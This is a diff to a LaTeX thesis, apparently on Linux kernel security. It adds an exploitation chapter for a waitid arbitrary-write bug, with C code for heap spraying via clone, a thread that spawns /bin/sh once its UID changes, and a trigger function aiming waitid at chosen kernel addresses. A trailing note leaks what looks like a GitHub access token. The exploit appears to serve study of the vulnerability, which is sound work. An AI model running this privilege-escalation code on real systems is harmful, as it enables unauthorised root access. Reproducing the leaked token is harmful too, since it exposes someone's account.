@@ -922,7 +922,10 @@ def container_of(ptr, typeobj, member):
 task_type = CachedType("struct task_struct")
 
 v = gdb.lookup_type('struct task_struct').pointer()
-
+# For KASLR
+#offset = 0xe0f480 + 0xffffffff8a400000
+#addr = gdb.Value(offset)
+#init = addr.cast(v)
 init = gdb.parse_and_eval("init_task").address
 def task_lists():
     task_ptr_type = task_type.get_type().pointer()
@@ -997,10 +1000,123 @@ This happens for a very simple reason: the new test user process has a different
 
 
 
+\section{Exploitation}
+\label{sect:exp-cve}   
+ 
+In the \refToSection{vulnerability_17} we have seen how this vulnerability can be exploited to obtain root privileges. In a real attack, we must consider that many techniques used previously are not available to the attacker, therefore it is necessary to find alternative techniques.
+We will then see how to combine everything to obtain a reliable program to perform the exploit.
 
+Making a small recap:
+\begin{itemize}
+   \item We know how to exploit the vulnerability and write to memory;
+   \item We can write 0 to an arbitrary memory address;
+   \item We know what \emph{UIDs} are and that by overriding their value we can escalate privileges.
+\end {itemize}
 
+The only thing missing is knowing the address to overwrite.
+Since even without enabling KASLR we will not be able to have a stable address to write to in memory, a good technique to use is spraying.
+
+\subsection{Spraying}
+\label{subsect:spraying}
+
+Spraying~\cite{ratanaworabhan2009nozzle} can be used to make it easier to exploit a vulnerability. That technique alone cannot be used to break security boundaries: a separate security issue is needed (as in our case).
+
+Spraying takes advantage of the fact that in most architectures and operating systems, the initial position of large heap allocations is predictable and consecutive allocations are roughly sequential.
+Therefore, by creating a large number of structures within the heap, you are more likely to exploit a possible vulnerability.
+
+In our case, it is necessary to identify a range of addresses where the structures are saved.
+To find it, you can create a maximum number of processes for that system and read the addresses of the structures with the program seen in the \refToSubSection{py_gdb}.
+
+We can run a program that creates processes a few times and see how addresses are changed, remembering to shut down the VM completely every time.
+To create enough processes we can use the clone like this:
+\begin{lstlisting}
+stack=malloc(STACK_SIZE)+STACK_SIZE;
+  for(x=0;x<MAX_THREADS;x++){
+    stackTop = malloc(STACK_SIZE) + STACK_SIZE;
+    if (!stackTop){
+      perror("[-] Malloc");
+      return -1;
+    }
+    pid = clone(spray_thread, stackTop, CLONE_VM | CLONE_FS|CLONE_FILES|CLONE_SYSVSEM | SIGCHLD, NULL);
+    if (pid == -1){
+      perror("\n\nCLONE");
+      return -1;
+    }
+    printf("[0] Process created: %d\r", x);
+    }
+\end{lstlisting}
+
+\subsection{Proof of concept}
+\label{subsect:poc}
+
+PoC is not very complex: just create many threads and start overwriting at an arbitrary address. Our threads will only have to "check” their UID and do "something” in case it changes.
+
+Inizialmente creiamo dei processi con il pezzo di codice visto nella \refToSubSection{spraying} che eseguono tutti la funzione \texttt{spray_thread}.
+\begin{lstlisting}
+struct shared_area{
+  int one_win;
+};
+struct shared_area glob_var;
+
+// Sprayed thread
+int spray_thread(void *arg){
+  int uid;
+  int previous_one = syscall(__NR_getuid);
+  // Loop over syscall getUID
+  while(1){
+    uid = syscall(__NR_getuid);
+    printf("UID: %d\n",uid);
+    // If returned UID is different from the previous one, then we have hitted a struct cred area
+    if (uid != previous_one){
+      printf("Previous one %d\n" , previous_one);
+      printf("WIN!! with %d", uid);
+      // Kill other treads in order to stabilize the system
+      glob_var.one_win = 1;
+      // Simply spawn a shell
+      system("/bin/sh");
+    }
+    if(glob_var.one_win == 1)
+      return 1;
+  }
+  return 0;
+}
+\end{lstlisting}
+This function checks that the \emph{UID} of the process has not changed. In case it has changed it means that we have overwritten the structure with the system call \texttt{waitid}, then call a shell. In this scenario, this shell should be called with root privileges.
+
+The next step is, after having identified the address range with the \refToSubSection{spraying} method, iterate over that range by advancing 4Kb in an attempt to find the address of a structure saved in the heap.
+\begin{lstlisting}
+int thread_ready;
+void *stack;
+int trigger_bug(uint64_t where, int what){
+  printf("[0] Trying to overwrite 0x%016lx\r", where);
+  int p;
+  
+  thread_ready = what;
+  if (fork()==0){
+    p = getpid();
+    printf("\n\n\npid:%d\n",p);
+    thread_ready=1;
+  }
+  int err;
+  while(thread_ready == 0) {syscall(__NR_sched_yield);}
+  err = syscall(__NR_waitid, P_PID, p, where, WEXITED, NULL);
+  printf("Print the result of the waitid %d \n",err);  
+  return err;
+}
+\end{lstlisting}
+
+This method guarantees, with a probability of 50\%, a local privilege escalation.
 
 \chapter{Conclusion}
+\vtnote{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
+
+QEMU-system-i386 -hda archlinux-i686.img -boot d -cdrom ../archlinux
+.12.01-dual.iso -m 1024
+
+sudo debootstrap --include=vim,openssh-server,isc-dhcp-client  stable /tmp/mount1/ http://deb.debian.org/debian/
+
+source -s -v ...py}
+
 \bibliographystyle{alphaurl}
 \bibliography{bib}
 \end{document}
